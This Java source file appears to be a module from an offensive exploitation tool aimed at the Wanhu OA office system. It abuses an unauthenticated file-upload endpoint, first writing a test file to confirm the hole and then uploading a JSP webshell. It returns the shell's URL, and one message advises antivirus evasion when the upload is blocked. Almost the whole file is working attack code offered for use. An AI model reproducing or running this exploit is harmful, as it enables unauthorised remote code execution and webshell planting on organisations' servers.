package exp.oa.wanhuoa;

import core.Exploitlnterface;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class wanhuoa_fileUploadController implements Exploitlnterface {
    private String filename;

    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private Boolean att(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0");
        String post = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"nishizhu.txt\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n" + shell.test_payload + "\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--";

        Response post1 = HttpTools.post(url + "/defaultroot/upload/fileUpload.controller", post, head, "utf-8");
        if(post1.getCode() == 200 && post1.getText().contains("success")){
            //使用正则表达式抓取
            Pattern pattern = Pattern.compile("\\d+.txt");
            Matcher matcher = pattern.matcher(post1.getText().trim());
            while (matcher.find()) {
                filename = matcher.group();
                break;
            }
            Response response = HttpTools.get(url + "/defaultroot/upload/html/" + filename, new HashMap<String, String>(), "utf-8");
            if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
                textArea.appendText("\n");
                textArea.appendText("漏洞存在 测试文件写入成功\n " + url + "/defaultroot/upload/html/" + filename);
                return true;
            }else {
                textArea.appendText("\n");
                textArea.appendText("wanhuoa_fileUploadController-RCE-漏洞不存在 (出现误报请联系作者)");
                return false;
            }

        }else {
            textArea.appendText("\n");
            textArea.appendText("wanhuoa_fileUploadController-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }
    }

    private Boolean shell(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0");
        String post = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"nishizhu.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n" + shell.readFile(shell.Jsppath) + "\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--";

        Response post1 = HttpTools.post(url + "/defaultroot/upload/fileUpload.controller", post, head, "utf-8");
        if(post1.getCode() == 200 && post1.getText().contains("success")){
            //使用正则表达式抓取
            Pattern pattern = Pattern.compile("\\d+.jsp");
            Matcher matcher = pattern.matcher(post1.getText().trim());
            while (matcher.find()) {
                filename = matcher.group();
                break;
            }
            Response response = HttpTools.get(url + "/defaultroot/upload/html/" + filename, new HashMap<String, String>(), "utf-8");
            if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
                textArea.appendText("\n 漏洞存在 webshell文件写入成功\n " + url + "/defaultroot/upload/html/" + filename);
                return true;
            }else {
                textArea.appendText("\n shell写入失败 请手动查看 ");
                return false;
            }

        }else {
            textArea.appendText("\n 疑似杀软查杀！！请进行免杀！！");
            return false;
        }
    }


}
